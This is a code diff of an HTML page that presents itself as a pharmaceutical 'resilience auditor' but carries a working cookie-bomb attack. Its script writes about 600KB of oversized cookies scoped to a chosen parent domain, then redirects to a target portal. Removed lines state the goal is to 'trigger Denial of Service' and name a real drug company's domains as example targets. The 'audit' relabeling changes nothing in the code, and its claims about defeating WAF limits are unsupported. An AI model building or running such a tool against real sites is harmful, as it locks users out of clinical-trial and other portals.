@@ -2,60 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PharmaSec | Infrastructure Resilience Tool</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PharmaSec | 600KB Resilience Auditor</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding-top: 50px; }
-        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 500px; border-left: 5px solid #b3261e; }
-        h2 { color: #b3261e; margin-top: 0; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 0.9rem; }
-        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .warning { font-size: 0.8rem; color: #666; background: #fff3f3; padding: 10px; border-radius: 4px; margin: 15px 0; border: 1px solid #f8d7da; }
-        button { background: #b3261e; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #8e1f18; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 500px; border-top: 8px solid #d32f2f; }
+        h1 { color: #d32f2f; font-size: 1.5rem; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
+        p { color: #546e7a; font-size: 0.9rem; line-height: 1.5; }
+        .form-group { margin-top: 25px; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; color: #263238; font-size: 0.85rem; }
+        input { width: 100%; padding: 12px; border: 2px solid #cfd8dc; border-radius: 6px; box-sizing: border-box; font-size: 1rem; transition: border-color 0.3s; }
+        input:focus { border-color: #d32f2f; outline: none; }
+        .warning-box { background: #fff3e0; border-left: 4px solid #ff9800; padding: 15px; margin-top: 20px; font-size: 0.8rem; color: #e65100; }
+        .btn-execute { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 25px; transition: background 0.3s; }
+        .btn-execute:hover { background: #b71c1c; }
+        .footer { margin-top: 20px; font-size: 0.75rem; text-align: center; color: #90a4ae; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>🧬 500KB+ Persistence Audit</h2>
-    <p style="font-size: 0.9rem;">This tool simulates a stored cookie bomb to test header limits on pharma portals.</p>
-    
-    <div class="warning">
-        <strong>Note:</strong> This will store ~600KB of cookies in your browser for the chosen domain. You must manually clear cookies to restore access.
+<div class="container">
+    <h1>🔬 Resilience Auditor</h1>
+    <p>This tool verifies if pharmaceutical portals are susceptible to <b>Parent-Domain Cookie Overflows</b> (600KB+).</p>
+
+    <div class="form-group">
+        <label>1. Parent Domain Scope (e.g., .pharma-corp.com)</label>
+        <input type="text" id="parentDomain" placeholder=".example.com" value=".">
     </div>
 
-    <label>Target Parent Domain (Scope):</label>
-    <input type="text" id="pDomain" placeholder="e.g., .astrazeneca.com" value=".">
+    <div class="form-group">
+        <label>2. Target Portal URL (Subdomain to test)</label>
+        <input type="text" id="targetURL" placeholder="https://trials.example.com">
+    </div>
 
-    <label>Redirect Subdomain (Live Check):</label>
-    <input type="text" id="sDomain" placeholder="https://trials.astrazeneca.com">
+    <div class="warning-box">
+        <b>ATTENTION:</b> This will inject 170 cookies into your browser. This persists until manually cleared. Use only on authorized research targets.
+    </div>
 
-    <button onclick="deployMegaBomb()">🚀 EXECUTE 600KB BINDING</button>
+    <button class="btn-execute" onclick="startAudit()">🚀 ARM & REDIRECT</button>
+
+    <div class="footer">
+        Identity: Life Science & Pharmaceutical Discovery Agent
+    </div>
 </div>
 
 <script>
-    function deployMegaBomb() {
-        const parent = document.getElementById('pDomain').value.trim();
-        const target = document.getElementById('sDomain').value.trim();
+    function startAudit() {
+        const domain = document.getElementById('parentDomain').value.trim();
+        const target = document.getElementById('targetURL').value.trim();
 
-        if (parent === "." || !target.startsWith('http')) {
-            alert("Please provide a valid Parent Domain (starting with a dot) and a Target URL.");
+        if (domain === "." || domain.length < 3) {
+            alert("Please enter a valid Parent Domain starting with a dot (e.g., .target.com)");
+            return;
+        }
+        if (!target.startsWith('http')) {
+            alert("Target URL must include https://");
             return;
         }
 
+        console.log("Starting 600KB binding for: " + domain);
+
         try {
-            // We set 150 cookies, each ~4KB. Total = 600KB.
-            // This exceeds almost every modern pharmaceutical WAF limit.
-            for (let i = 0; i < 150; i++) {
-                let payload = "PHARMA_AUDIT_DATA_" + "X".repeat(3980) + i;
-                document.cookie = `bomb_id_${i}=${payload}; Domain=${parent}; Path=/; Max-Age=3600; SameSite=Lax`;
+            // Browsers have a ~180 cookie limit. We use 170 to stay safe.
+            // 170 cookies * 3.6KB = ~612KB Total Header Size.
+            for (let i = 0; i < 170; i++) {
+                // Each payload is roughly 3600 bytes of 'X'
+                let payload = "PHARMA_SEC_AUDIT_" + "X".repeat(3600) + "_" + i;
+                
+                // Max-Age 3600 = 1 Hour persistence
+                document.cookie = `audit_id_${i}=${payload}; Domain=${domain}; Path=/; Max-Age=3600; SameSite=Lax`;
             }
 
-            alert("600KB Payload Stored. Redirecting to trigger Denial of Service...");
-            window.location.href = target;
+            alert("Payload Armed: 600KB of cookies stored for " + domain + "\n\nRedirecting to target...");
+            
+            // Short delay to ensure browser DB commit
+            setTimeout(() => {
+                window.location.href = target;
+            }, 300);
 
         } catch (e) {
-            alert("Error: " + e.message);
+            alert("Critical Error: " + e.message);
         }
     }
 </script>
